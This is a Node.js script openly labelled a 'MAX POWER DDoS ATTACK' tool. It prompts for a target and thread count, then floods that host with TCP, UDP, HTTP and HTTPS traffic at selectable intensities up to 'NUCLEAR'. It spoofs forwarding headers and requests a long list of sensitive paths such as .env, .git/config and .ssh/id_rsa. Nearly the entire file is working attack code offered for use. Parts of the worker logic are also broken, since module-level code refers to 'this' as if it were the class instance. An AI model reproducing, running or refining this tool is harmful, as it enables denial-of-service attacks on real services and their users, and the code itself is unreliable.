#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');

const colors = {
    title: "\x1b[1;33m", 
    prompt: "\x1b[1;32m",
    error: "\x1b[1;31m",
    success: "\x1b[1;92m",
    warning: "\x1b[1;93m",
    info: "\x1b[1;96m",
    stat: "\x1b[1;97m",
    highlight: "\x1b[1;95m",
    reset: "\x1b[0m"
};

class DDoSAttackMaxPower {
    constructor() {
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            methods: { TCP: 0, UDP: 0, HTTP: 0, HTTPS: 0 }
        };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS'];
        this.startTime = Date.now();
        this.statsInterval = null;
        this.payloads = this.generatePayloads();
    }

    generatePayloads() {
        return {
            TCP: crypto.randomBytes(65535),
            UDP: crypto.randomBytes(65507),
            HTTP: this.generateHTTPRequest(),
            HTTPS: this.generateHTTPRequest(true)
        };
    }

    generateHTTPRequest(secure = false) {
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'];
        const routes = [
            '/', '/home', '/admin', '/dashboard', '/login', '/logout', '/register', '/signup', '/signin',
            '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/rest', '/soap', '/rpc', '/jsonrpc', '/xmlrpc',
            '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes', '/wordpress', '/joomla', '/drupal', '/magento', '/prestashop',
            '/administrator', '/phpmyadmin', '/mysql', '/dbadmin', '/database', '/pma', '/adminer', '/db', '/sql', '/sqlite',
            '/config', '/configuration', '/settings', '/setup', '/install', '/update', '/upgrade', '/maintenance', '/maint', '/install.php',
            '/backup', '/backups', '/backup.zip', '/backup.tar', '/backup.sql', '/back', '/old', '/new', '/temp', '/tmp',
            '/.env', '/.git', '/.svn', '/.hg', '/.bzr', '/.htaccess', '/.htpasswd', '/.well-known', '/.well-known/acme-challenge', '/.well-known/pki-validation',
            '/aws.yml', '/docker-compose.yml', '/dockerfile', '/env', '/environment', '/config.json', '/config.php', '/configuration.yml', '/settings.ini', '/config.ini',
            '/v1', '/v2', '/v3', '/latest', '/current', '/staging', '/dev', '/development', '/test', '/testing',
            '/users', '/accounts', '/profiles', '/dashboard', '/console', '/shell', '/cmd', '/command', '/cli', '/terminal',
            '/internal', '/secure', '/private', '/secret', '/confidential', '/hidden', '/protected', '/auth', '/authentication', '/oauth',
            '/payment', '/payments', '/checkout', '/billing', '/invoice', '/cart', '/shop', '/store', '/ecommerce', '/products',
            '/search', '/find', '/query', '/filter', '/select', '/browse', '/explore', '/discover', '/list', '/catalog',
            '/public', '/static', '/assets', '/images', '/img', '/pictures', '/photos', '/media', '/uploads', '/downloads',
            '/javascript', '/js', '/stylesheets', '/css', '/fonts', '/webfonts', '/icons', '/svg', '/png', '/jpg',
            '/documentation', '/help', '/support', '/faq', '/contact', '/about', '/info', '/status', '/health', '/ping',
            '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics', '/actuator/env', '/actuator/beans', '/actuator/mappings', '/actuator/threaddump', '/actuator/heapdump', '/actuator/configprops',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/console.php', '/phpinfo', '/xdebug', '/debug', '/trace', '/logs',
            '/.git/config', '/.git/HEAD', '/.git/logs/HEAD', '/.git/index', '/.git/objects', '/.git/refs', '/.git/hooks', '/.git/info', '/.git/description', '/.gitignore',
            '/.idea', '/.vscode', '/.DS_Store', '/Thumbs.db', '/desktop.ini', '/composer.lock', '/package.json', '/package-lock.json', '/yarn.lock', '/bower.json',
            '/crossdomain.xml', '/clientaccesspolicy.xml', '/robots.txt', '/sitemap.xml', '/sitemap', '/sitemap_index.xml', '/sitemap1.xml', '/sitemap2.xml', '/sitemap3.xml', '/sitemap4.xml',
            '/.ssh', '/.ssh/authorized_keys', '/.ssh/id_rsa', '/.ssh/id_rsa.pub', '/.ssh/known_hosts', '/.ssh/config', '/.ssh/identity', '/.ssh/identity.pub', '/.ssh/id_dsa', '/.ssh/id_dsa.pub',
            '/.npmrc', '/.yarnrc', '/.env.local', '/.env.production', '/.env.development', '/.env.test', '/.env.staging', '/.env.example', '/.env.sample', '/env.example',
            '/backup_config.php', '/backup_settings.php', '/backup_db.php', '/backup_sql.php', '/db_backup.sql', '/database.sql', '/dump.sql', '/export.sql', '/import.sql', '/migrate.sql',
            '/wp-config.php', '/wp-config.bak', '/wp-config.old', '/wp-config.txt', '/wp-config-sample.php', '/configuration.php', '/config.php.bak', '/config.php.old', '/config.php.save', '/config.php~',
            '/appsettings.json', '/app.config', '/web.config', '/application.yml', '/application.properties', '/application.cfg', '/settings.cfg', '/config.cfg', '/setup.cfg', '/system.cfg',
            '/vendor', '/node_modules', '/bower_components', '/composer', '/vendor.php', '/vendors', '/dependencies', '/lib', '/libs', '/library',
            '/cgi-bin', '/cgi', '/scripts', '/bin', '/binaries', '/exe', '/executables', '/sh', '/bash', '/shell',
            '/storage', '/storage/files', '/storage/backups', '/storage/logs', '/storage/app', '/storage/framework', '/storage/cache', '/storage/sessions', '/storage/views', '/storage/uploads',
            '/logs', '/error.log', '/access.log', '/debug.log', '/server.log', '/system.log', '/application.log', '/security.log', '/auth.log', '/error_log',
            '/temp', '/temporary', '/cache', '/cached', '/tmp', '/tmp_files', '/tmp_upload', '/temp_upload', '/cache_files', '/session',
            '/vendor', '/node_modules', '/bower_components', '/composer', '/vendor.php', '/vendors', '/dependencies', '/lib', '/libs', '/library',
            '/_api', '/_rest', '/_graphql', '/_soap', '/_xmlrpc', '/_internal', '/_private', '/_secure', '/_hidden', '/_protected',
            '/old_site', '/new_site', '/previous', '/legacy', '/archive', '/historical', '/v0', '/beta', '/alpha', '/rc',
            '/management', '/manager', '/director', '/control', '/console_admin', '/sysadmin', '/root', '/superuser', '/webmaster', '/operator',
            '/filemanager', '/fileadmin', '/fileupload', '/filedownload', '/filebrowser', '/explorer', '/browser', '/viewer', '/editor', '/upload',
            '/service', '/services', '/api_gateway', '/gateway', '/proxy', '/reverse_proxy', '/loadbalancer', '/balancer', '/cluster', '/server',
            '/monitoring', '/monitor', '/statuspage', '/healthcheck', '/readiness', '/liveness', '/metrics', '/prometheus', '/grafana', '/kibana',
            '/.aws', '/.azure', '/.gcloud', '/.kube', '/.docker', '/.vagrant', '/.terraform', '/.serverless', '/.github', '/.gitlab',
            '/swagger', '/swagger-ui', '/swagger.json', '/swagger.yaml', '/openapi', '/openapi.json', '/redoc', '/docs', '/documentation', '/api-docs',
            '/oauth2', '/openid', '/saml', '/jwt', '/token', '/keys', '/certs', '/certificates', '/authorize', '/authenticate',
            '/payment_gateway', '/stripe', '/paypal', '/braintree', '/checkout_process', '/checkout_success', '/checkout_failure', '/billing_info', '/payment_methods', '/invoices',
            '/search_results', '/advanced_search', '/query_results', '/filters', '/browse_category', '/browse_all', '/discover_new', '/trending', '/popular', '/recommended',
            '/public_files', '/static_content', '/asset_management', '/image_gallery', '/photo_album', '/media_library', '/upload_form', '/download_center', '/content_delivery', '/cdn',
            '/js_libs', '/css_frameworks', '/font_assets', '/icon_set', '/svg_icons', '/png_assets', '/jpg_resources', '/webp_images', '/media_files', '/multimedia',
            '/help_center', '/support_tickets', '/faq_section', '/contact_us', '/about_us', '/company_info', '/team', '/careers', '/privacy', '/terms',
            '/health_status', '/server_status', '/performance', '/uptime', '/metrics_data', '/analytics', '/stats', '/usage', '/reports', '/diagnostics',
            '/old_version', '/new_version', '/legacy_system', '/archive_data', '/historical_records', '/v0_api', '/beta_test', '/alpha_release', '/release_candidate', '/stable',
            '/sysadmin_tools', '/root_access', '/superuser_panel', '/webmaster_tools', '/operator_console', '/control_panel', '/director_access', '/management_console', '/admin_tools', '/system_administration',
            '/file_management', '/content_upload', '/download_manager', '/browse_files', '/explore_content', '/view_documents', '/edit_content', '/upload_interface', '/download_portal', '/file_repository',
            '/service_endpoint', '/api_services', '/gateway_access', '/proxy_server', '/reverse_proxy_config', '/load_balancer', '/cluster_management', '/server_status', '/service_health', '/api_health',
            '/monitoring_tools', '/status_monitor', '/health_dashboard', '/readiness_check', '/liveness_check', '/metrics_endpoint', '/prometheus_data', '/grafana_dashboard', '/kibana_logs', '/elasticsearch',
            '/aws_config', '/azure_settings', '/gcloud_config', '/kube_config', '/docker_setup', '/vagrant_config', '/terraform_state', '/serverless_config', '/github_settings', '/gitlab_config',
            '/swagger_docs', '/openapi_spec', '/redoc_documentation', '/api_documentation', '/developer_portal', '/api_explorer', '/sandbox', '/test_console', '/interactive_docs', '/reference',
            '/vpn_config', '/vpn_settings', '/vpn_status', '/vpn_connect', '/vpn_disconnect', '/vpn_logs', '/vpn_diagnostics', '/vpn_management', '/vpn_admin', '/vpn_dashboard',
            '/cms_admin', '/cms_dashboard', '/cms_content', '/cms_media', '/cms_templates', '/cms_plugins', '/cms_themes', '/cms_settings', '/cms_update', '/cms_backup',
            '/erp_dashboard', '/erp_inventory', '/erp_sales', '/erp_purchasing', '/erp_accounting', '/erp_hr', '/erp_reporting', '/erp_settings', '/erp_integration', '/erp_backup',
            '/crm_dashboard', '/crm_contacts', '/crm_leads', '/crm_opportunities', '/crm_activities', '/crm_reports', '/crm_settings', '/crm_integration', '/crm_import', '/crm_export',
            '/bi_dashboard', '/bi_reports', '/bi_analytics', '/bi_datasets', '/bi_visualization', '/bi_scheduling', '/bi_sharing', '/bi_settings', '/bi_integration', '/bi_export',
            '/iot_dashboard', '/iot_devices', '/iot_sensors', '/iot_controls', '/iot_analytics', '/iot_alerts', '/iot_settings', '/iot_integration', '/iot_firmware', '/iot_logs',
            '/ai_endpoint', '/ai_model', '/ai_prediction', '/ai_training', '/ai_dashboard', '/ai_analytics', '/ai_settings', '/ai_documentation', '/ai_examples', '/ai_sandbox',
            '/blockchain_explorer', '/blockchain_transactions', '/blockchain_wallets', '/blockchain_contracts', '/blockchain_settings', '/blockchain_dashboard', '/blockchain_api', '/blockchain_docs', '/blockchain_status', '/blockchain_nodes',
            '/game_api', '/game_assets', '/game_config', '/game_leaderboard', '/game_analytics', '/game_settings', '/game_admin', '/game_update', '/game_backup', '/game_logs',
            '/mobile_api', '/mobile_config', '/mobile_push', '/mobile_analytics', '/mobile_settings', '/mobile_admin', '/mobile_backend', '/mobile_docs', '/mobile_status', '/mobile_logs',
            '/microservice_a', '/microservice_b', '/microservice_c', '/microservice_d', '/microservice_e', '/service_registry', '/config_server', '/api_gateway_service', '/auth_service', '/logging_service',
            '/legacy_api', '/deprecated_api', '/sunset_api', '/retired_api', '/obsolete_api', '/old_api', '/new_api', '/experimental_api', '/unstable_api', '/stable_api',
            '/internal_tool_a', '/internal_tool_b', '/internal_tool_c', '/employee_portal', '/hr_portal', '/finance_portal', '/it_portal', '/sales_portal', '/support_portal', '/executive_dashboard',
            '/partner_api', '/partner_portal', '/vendor_portal', '/supplier_portal', '/distributor_portal', '/reseller_portal', '/affiliate_portal', '/integration_portal', '/api_partner', '/sdk_download'
        ];
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'curl/8.4.0'
        ];
        const contentTypes = [
            'application/json',
            'application/xml',
            'text/html',
            'multipart/form-data',
            'application/x-www-form-urlencoded'
        ];

        const randomMethod = methods[Math.floor(Math.random() * methods.length)];
        const randomRoute = routes[Math.floor(Math.random() * routes.length)];
        const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const randomContentType = contentTypes[Math.floor(Math.random() * contentTypes.length)];
        const randomIP = Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.');
        const randomParams = crypto.randomBytes(24).toString('hex');
        const body = randomMethod !== 'GET' ? crypto.randomBytes(1024).toString('hex') : '';

        const headers = [
            `Host: ${workerData?.target || 'target.com'}`,
            `User-Agent: ${randomUserAgent}`,
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.9',
            'Connection: keep-alive',
            'Cache-Control: no-cache, no-store, must-revalidate',
            `X-Forwarded-For: ${randomIP}`,
            `X-Real-IP: ${randomIP}`,
            `Content-Type: ${randomContentType}`,
            `Referer: https://${workerData?.target || 'target.com'}${routes[Math.floor(Math.random() * routes.length)]}`,
            `Content-Length: ${body.length}`
        ];

        return Buffer.from([
            `${randomMethod} ${randomRoute}?${randomParams} HTTP/1.1`,
            ...headers,
            '',
            body
        ].join('\r\n'));
    }

    async start() {
        console.log(`${colors.title}\n[ MAX POWER DDoS ATTACK ]${colors.reset}\n`);
        
        const target = await this.ask(`${colors.prompt}Target (URL/IP): ${colors.reset}`);
        const { host, port, protocol } = await this.resolveTarget(target);
        const threads = await this.numberBetween(`${colors.prompt}Threads (5000-100000): ${colors.reset}`, 5000, 100000);
        const duration = await this.numberBetween(`${colors.prompt}Duration (minutes): ${colors.reset}`, 1, 1440);
        const intensity = await this.selectIntensity();

        console.log(`${colors.info}\n- Target: ${host}:${port}${colors.reset}`);
        console.log(`${colors.info}- Protocol: ${protocol.toUpperCase()}${colors.reset}`);
        console.log(`${colors.info}- Threads: ${threads.toLocaleString('en-US')}${colors.reset}`);
        console.log(`${colors.info}- Duration: ${duration} minutes${colors.reset}`);
        console.log(`${colors.info}- Intensity: ${intensity}${colors.reset}`);

        this.startAttack(host, port, threads, intensity);
        this.showStats();
        setTimeout(() => this.stop(), duration * 60000);
    }

    async selectIntensity() {
        console.log(`\n${colors.info}Attack intensity level:${colors.reset}`);
        console.log(`${colors.warning}1. Moderate${colors.reset}`);
        console.log(`${colors.warning}2. Aggressive${colors.reset}`);
        console.log(`${colors.warning}3. Extreme${colors.reset}`);
        console.log(`${colors.warning}4. NUCLEAR${colors.reset}\n`);

        const choice = await this.numberBetween(`${colors.prompt}Selection: ${colors.reset}`, 1, 4);
        return ['Moderate', 'Aggressive', 'Extreme', 'NUCLEAR'][choice - 1];
    }

    startAttack(target, port, threads, intensity) {
        if (cluster.isMaster) {
            const cores = Math.min(os.cpus().length, 64);
            console.log(`${colors.info}Starting attack with ${cores} CPU cores...${colors.reset}`);
            
            for (let i = 0; i < cores; i++) {
                cluster.fork();
            }

            cluster.on('exit', (worker) => {
                cluster.fork();
            });
        } else {
            const workerThreads = Math.ceil(threads / os.cpus().length);

            for (let i = 0; i < workerThreads; i++) {
                const method = this.methods[Math.floor(Math.random() * this.methods.length)];
                const worker = new Worker(__filename, { 
                    workerData: { 
                        target, 
                        port, 
                        method,
                        intensity
                    }
                });
                
                worker.on('message', (msg) => {
                    this.stats.total += msg.total || 0;
                    this.stats.success += msg.success || 0;
                    this.stats.failed += msg.failed || 0;
                    this.stats.bandwidth += msg.bandwidth || 0;
                    if (msg.method) this.stats.methods[msg.method]++;
                });
                
                this.workers.push(worker);
            }
        }
    }

    calculateDelay(intensity) {
        const delays = {
            'Moderate': 50,
            'Aggressive': 10,
            'Extreme': 1,
            'NUCLEAR': 0
        };
        return delays[intensity] || 10;
    }

    showStats() {
        const render = () => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const minutes = Math.floor(elapsed / 60);
            const seconds = Math.floor(elapsed % 60);
            const rps = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
            const bw = (this.stats.bandwidth / (1024 ** 2)).toFixed(2);
            const successRate = this.stats.total > 0 
                ? ((this.stats.success / this.stats.total) * 100).toFixed(1) 
                : '0.0';

            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);

            const statsDisplay = [
                `${colors.highlight}Time: ${minutes}m ${seconds}s${colors.reset}`,
                `${colors.stat}Req: ${colors.info}${this.stats.total.toLocaleString('en-US')}${colors.reset}`,
                `${colors.stat}Success: ${colors.success}${this.stats.success.toLocaleString('en-US')}${colors.reset}`,
                `${colors.stat}Failed: ${colors.error}${this.stats.failed.toLocaleString('en-US')}${colors.reset}`,
                `${colors.stat}Rate: ${colors.warning}${successRate}%${colors.reset}`,
                `${colors.stat}RPS: ${colors.highlight}${Number(rps).toLocaleString('en-US')}/s${colors.reset}`,
                `${colors.stat}BW: ${colors.info}${bw} MB/s${colors.reset}`
            ].join(' | ');

            process.stdout.write(statsDisplay);
        };

        this.statsInterval = setInterval(render, 250);
        render();
    }

    async ask(question) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(question, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolveTarget(input) {
        try {
            const parsed = new url.URL(input.includes('://') ? input : `http://${input}`);
            const resolved = await dns.lookup(parsed.hostname);
            return { 
                host: resolved.address, 
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                protocol: parsed.protocol.replace(':', '')
            };
        } catch {
            console.log(`${colors.error}\nInvalid target!${colors.reset}`);
            process.exit(1);
        }
    }

    stop() {
        clearInterval(this.statsInterval);
        if (cluster.isMaster) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
        this.workers.forEach(w => w.terminate());
        console.log(`${colors.success}\n[ ATTACK COMPLETED ]${colors.reset}`);
        console.log(`${colors.info}Final stats:`);
        console.log(`${colors.stat}- Total requests: ${colors.info}${this.stats.total.toLocaleString('en-US')}`);
        console.log(`${colors.stat}- Successful requests: ${colors.success}${this.stats.success.toLocaleString('en-US')}`);
        console.log(`${colors.stat}- Bandwidth consumed: ${colors.info}${(this.stats.bandwidth / (1024 ** 3)).toFixed(2)} GB${colors.reset}`);
        process.exit();
    }
}

if (!isMainThread) {
    const { target, port, method, intensity } = workerData;
    const delay = this.calculateDelay(intensity);
    const intensityFactor = intensity === 'NUCLEAR' ? 100 : intensity === 'Extreme' ? 50 : intensity === 'Aggressive' ? 20 : 5;

    const attackMethods = {
        TCP: () => {
            try {
                const socket = net.connect(port, target, () => {
                    for (let i = 0; i < intensityFactor; i++) {
                        socket.write(this.payloads.TCP);
                    }
                    socket.destroy();
                    parentPort.postMessage({ 
                        total: intensityFactor, 
                        success: intensityFactor, 
                        failed: 0, 
                        bandwidth: this.payloads.TCP.length * intensityFactor,
                        method: 'TCP'
                    });
                });
                socket.on('error', () => {
                    parentPort.postMessage({ 
                        total: intensityFactor, 
                        success: 0, 
                        failed: intensityFactor, 
                        bandwidth: 0,
                        method: 'TCP'
                    });
                });
                socket.setTimeout(3000, () => socket.destroy());
            } catch {}
        },
        UDP: () => {
            try {
                const socket = dgram.createSocket('udp4');
                for (let i = 0; i < intensityFactor * 2; i++) {
                    socket.send(this.payloads.UDP, port, target, () => {
                        parentPort.postMessage({ 
                            total: 1, 
                            success: 1, 
                            failed: 0, 
                            bandwidth: this.payloads.UDP.length,
                            method: 'UDP'
                        });
                    });
                }
                setTimeout(() => socket.close(), 50);
            } catch {}
        },
        HTTP: () => {
            try {
                const options = {
                    host: target,
                    port: port,
                    method: ['GET', 'POST', 'PUT'][Math.floor(Math.random() * 3)],
                    path: `/${crypto.randomBytes(12).toString('hex')}`,
                    headers: {
                        'User-Agent': this.payloads.HTTP.toString().split('\r\n')[2].split(': ')[1],
                        'X-Forwarded-For': Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.'),
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    }
                };
                
                const req = http.request(options);
                req.on('response', () => {
                    parentPort.postMessage({ 
                        total: 1, 
                        success: 1, 
                        failed: 0, 
                        bandwidth: this.payloads.HTTP.length,
                        method: 'HTTP'
                    });
                });
                req.on('error', () => {
                    parentPort.postMessage({ 
                        total: 1, 
                        success: 0, 
                        failed: 1, 
                        bandwidth: 0,
                        method: 'HTTP'
                    });
                });
                req.end();
            } catch {}
        },
        HTTPS: () => {
            try {
                const options = {
                    host: target,
                    port: port,
                    method: 'GET',
                    path: `/${crypto.randomBytes(12).toString('hex')}`,
                    rejectUnauthorized: false,
                    headers: {
                        'User-Agent': this.payloads.HTTPS.toString().split('\r\n')[2].split(': ')[1],
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache'
                    }
                };
                
                const req = https.request(options);
                req.on('response', () => {
                    parentPort.postMessage({ 
                        total: 1, 
                        success: 1, 
                        failed: 0, 
                        bandwidth: this.payloads.HTTPS.length,
                        method: 'HTTPS'
                    });
                });
                req.on('error', () => {
                    parentPort.postMessage({ 
                        total: 1, 
                        success: 0, 
                        failed: 1, 
                        bandwidth: 0,
                        method: 'HTTPS'
                    });
                });
                req.end();
            } catch {}
        }
    };

    const attack = () => attackMethods[method]();
    
    if (intensity === 'NUCLEAR') {
        const attackWave = () => {
            for (let i = 0; i < 10; i++) attack();
        };
        setInterval(attackWave, 1);
    } else if (intensity === 'Extreme') {
        const attackWave = () => {
            for (let i = 0; i < 5; i++) attack();
        };
        setInterval(attackWave, 1);
    } else {
        setInterval(attack, delay);
    }
}

if (isMainThread && !cluster.isWorker) {
    new DDoSAttackMaxPower().start();
}